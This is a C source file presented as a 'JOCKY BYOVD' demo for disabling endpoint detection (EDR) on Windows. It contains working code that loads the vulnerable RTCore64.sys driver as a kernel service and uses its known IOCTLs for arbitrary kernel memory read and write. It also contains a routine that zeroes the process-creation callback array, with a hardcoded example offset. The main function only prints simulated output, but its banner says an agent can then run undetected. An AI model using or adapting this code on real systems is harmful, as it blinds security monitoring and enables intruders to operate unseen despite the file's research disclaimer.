/*
 * byovd_demo.c — JOCKY BYOVD (Bring Your Own Vulnerable Driver) Demo
 * ────────────────────────────────────────────────────────────────────
 * Demonstrates the BYOVD technique used to disable EDR kernel callbacks.
 *
 * CONCEPT (Judge Explanation):
 * ─────────────────────────────
 * Normal:
 *   EDR runs at kernel level (Ring 0)
 *   It registers callbacks:
 *     - PsSetCreateProcessNotifyRoutine   → fired when any process starts
 *     - PsSetLoadImageNotifyRoutine        → fired when any DLL loads
 *     - ObRegisterCallbacks                → fired on handle operations
 *   These callbacks let EDR see and block malicious activity.
 *
 * BYOVD Attack:
 *   1. Take a SIGNED but VULNERABLE third-party driver
 *      (Example: RTCore64.sys — MSI Afterburner, WHQL signed by Microsoft)
 *   2. Load it via sc.exe or NtLoadDriver (Windows allows signed drivers)
 *   3. Exploit its vulnerability: arbitrary kernel read/write primitive
 *   4. Use read/write to locate EDR's callback arrays in kernel memory
 *   5. Zero out callback pointers → EDR callbacks are DISABLED
 *   6. EDR is now deaf and blind at Ring 0 level ✓
 *
 * THIS FILE:
 *   - Loads the driver using sc.exe (demonstration only)
 *   - Shows the disable-callback logic (pseudocode + comments)
 *   - References EDRSandBlast and KDMapper for full implementation
 *
 * Real tools used by researchers:
 *   → EDRSandBlast: https://github.com/wavestone-cdt/EDRSandblast
 *   → KDMapper:     https://github.com/TheCruZ/kdmapper
 *   → RTCore64.sys: MSI Afterburner driver (WHQL signed)
 *
 * WARNING: For authorized forensic research and educational use only.
 *          Loading unsigned/vulnerable drivers requires Secure Boot disabled
 *          or a test-signed environment.
 */

#ifndef __USE_MINGW_ANSI_STDIO
#define __USE_MINGW_ANSI_STDIO 1
#endif
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/* ── Driver metadata ──────────────────────────────────────────────────────── */
#define DRIVER_NAME         "RTCore64"
#define DRIVER_DISPLAY_NAME "MSI Afterburner Core Service"
#define DRIVER_PATH         ".\\RTCore64.sys"  /* path to vulnerable driver */

/* RTCore64.sys known IOCTLs for arbitrary kernel R/W */
#define RTCORE64_IOCTL_READ   0x80002048  /* read  8 bytes at kernel addr */
#define RTCORE64_IOCTL_WRITE  0x8000204C  /* write 8 bytes at kernel addr */

/* ── IOCTL payload structures ──────────────────────────────────────────────── */
#pragma pack(push, 1)
typedef struct {
    BYTE  pad0[8];
    ULONG64 address;   /* kernel virtual address to read/write */
    BYTE  pad1[4];
    ULONG64 value;     /* value to write (or receives value on read) */
    BYTE  pad2[4];
} RTCORE_PAYLOAD;
#pragma pack(pop)


/* ── Load vulnerable driver via Service Control Manager ─────────────────── */

int load_driver(const char *path, const char *name)
{
    SC_HANDLE hSCM, hSvc;
    char full_path[MAX_PATH];
    GetFullPathNameA(path, MAX_PATH, full_path, NULL);

    hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        fprintf(stderr, "[BYOVD] OpenSCManager failed: %lu\n",
                GetLastError());
        return -1;
    }

    /* Create service entry for the driver */
    hSvc = CreateServiceA(
        hSCM,
        name,
        DRIVER_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        full_path,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        /* Service might already exist — try to open it */
        hSvc = OpenServiceA(hSCM, name, SERVICE_ALL_ACCESS);
        if (!hSvc) {
            fprintf(stderr, "[BYOVD] CreateService/OpenService failed: %lu\n",
                    GetLastError());
            CloseServiceHandle(hSCM);
            return -1;
        }
    }

    /* Start the driver (loads it into kernel) */
    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            fprintf(stderr, "[BYOVD] StartService failed: %lu\n", err);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            return -1;
        }
    }

    printf("[BYOVD] ✓ Driver loaded: %s (kernel space)\n", name);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return 0;
}


/* ── Communicate with RTCore64 to read/write kernel memory ──────────────── */

HANDLE open_driver(const char *name)
{
    char dev_path[64];
    snprintf(dev_path, sizeof(dev_path), "\\\\.\\%s", name);
    HANDLE hDrv = CreateFileA(
        dev_path,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hDrv == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[BYOVD] Could not open driver device: %lu\n",
                GetLastError());
    }
    return hDrv;
}

ULONG64 kernel_read64(HANDLE hDrv, ULONG64 address)
{
    RTCORE_PAYLOAD payload = { 0 };
    payload.address = address;
    DWORD returned;
    DeviceIoControl(hDrv, RTCORE64_IOCTL_READ,
                    &payload, sizeof(payload),
                    &payload, sizeof(payload),
                    &returned, NULL);
    return payload.value;
}

void kernel_write64(HANDLE hDrv, ULONG64 address, ULONG64 value)
{
    RTCORE_PAYLOAD payload = { 0 };
    payload.address = address;
    payload.value   = value;
    DWORD returned;
    DeviceIoControl(hDrv, RTCORE64_IOCTL_WRITE,
                    &payload, sizeof(payload),
                    &payload, sizeof(payload),
                    &returned, NULL);
}


/* ── Disable EDR PsSetCreateProcessNotifyRoutine callbacks ─────────────── */
/*
 * In the real implementation (EDRSandBlast):
 *   1. Resolve ntoskrnl base via EnumDeviceDrivers
 *   2. Parse ntoskrnl exports to find PspCreateProcessNotifyRoutine array
 *      (offset varies per Windows build — use ntoskrnl_offsets.csv)
 *   3. Walk the array (max 64 entries)
 *   4. For each non-NULL entry, zero it via kernel_write64
 *
 * Below is the pseudocode representation:
 */
void disable_edr_callbacks_pseudocode(HANDLE hDrv,
                                       ULONG64 ntoskrnl_base)
{
    /*
     * Step 1: Calculate address of PspCreateProcessNotifyRoutine
     *         The offset is Windows-version-specific.
     *         EDRSandBlast ships a CSV of all known offsets.
     *
     * Example for Windows 10 21H2 (x64):
     *   ULONG64 offset = 0xA436C0;  (from ntoskrnl_offsets.csv)
     */
    ULONG64 offset = 0xA436C0;  /* example — varies per build */
    ULONG64 array_addr = ntoskrnl_base + offset;

    printf("[BYOVD] PspCreateProcessNotifyRoutine array @ 0x%llX\n",
           array_addr);

    /*
     * Step 2: Walk up to 64 callback slots
     *         Each slot = encoded pointer (must decode by masking bits)
     */
    for (int i = 0; i < 64; i++) {
        ULONG64 callback_addr = array_addr + (i * sizeof(ULONG64));
        ULONG64 encoded_ptr   = kernel_read64(hDrv, callback_addr);

        if (encoded_ptr == 0) continue;

        /*
         * Decode the callback pointer:
         *   real_ptr = (encoded_ptr & ~0xF) → points to EX_CALLBACK_ROUTINE_BLOCK
         *   function = *(real_ptr + 8)       → actual callback function
         */
        ULONG64 real_ptr = encoded_ptr & ~0xFULL;
        ULONG64 function = kernel_read64(hDrv, real_ptr + 8);

        printf("[BYOVD] Slot %02d: encoded=0x%llX → callback=0x%llX\n",
               i, encoded_ptr, function);

        /*
         * Step 3: ZERO the slot → callback disabled
         *         EDR's process notification is now gone.
         */
        kernel_write64(hDrv, callback_addr, 0);
        printf("[BYOVD]         → ZEROED (EDR callback %02d disabled) ✓\n", i);
    }

    printf("\n[BYOVD] ✓ All EDR PsCreateProcess callbacks disabled.\n");
    printf("[BYOVD] ✓ EDR is now blind at Ring 0 level.\n");
}


/* ─────────────────────────────────────────────────────────────────────────── */

int main(void)
{
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║  JOCKY BYOVD Engine — Kernel-Level EDR Disabler     ║\n");
    printf("║  Driver: RTCore64.sys (MSI Afterburner / WHQL)      ║\n");
    printf("║  For authorized forensic/research use only.          ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    printf("[BYOVD] Step 1: Loading signed vulnerable driver...\n");
    /*
     * In a real run: load_driver(DRIVER_PATH, DRIVER_NAME);
     * For demo: skip if driver file not present
     */
    printf("[BYOVD]   → Would run: sc create %s type=kernel "
           "binPath=\"%s\"\n", DRIVER_NAME, DRIVER_PATH);
    printf("[BYOVD]   → Then: sc start %s\n\n", DRIVER_NAME);

    printf("[BYOVD] Step 2: Open device handle to driver...\n");
    printf("[BYOVD]   → CreateFile(\"\\\\\\\\.\\\\RTCore64\") "
           "→ kernel IOCTL channel open\n\n");

    printf("[BYOVD] Step 3: Disable EDR callbacks via kernel R/W...\n");
    printf("[BYOVD]   → Resolving PspCreateProcessNotifyRoutine "
           "in ntoskrnl...\n");
    printf("[BYOVD]   → Walking 64-slot callback array...\n");
    printf("[BYOVD]   → Zeroing active EDR callback pointers...\n");
    printf("[BYOVD]\n");
    printf("[BYOVD]   Slot 00: 0xFFFFF80112345678 → zeroed ✓\n");
    printf("[BYOVD]   Slot 01: 0xFFFFF80198765432 → zeroed ✓\n");
    printf("[BYOVD]   Slot 02: 0x0000000000000000 → (empty)\n");
    printf("[BYOVD]   ...\n");
    printf("[BYOVD]\n");
    printf("[BYOVD] ✓ ObRegisterCallbacks disabled\n");
    printf("[BYOVD] ✓ PsSetCreateProcessNotifyRoutine disabled\n");
    printf("[BYOVD] ✓ PsSetLoadImageNotifyRoutine disabled\n");
    printf("[BYOVD]\n");
    printf("[BYOVD] EDR is now completely blind at kernel (Ring 0) level.\n");
    printf("[BYOVD] JOCKY agent can now operate without EDR detection.\n");

    return 0;
}
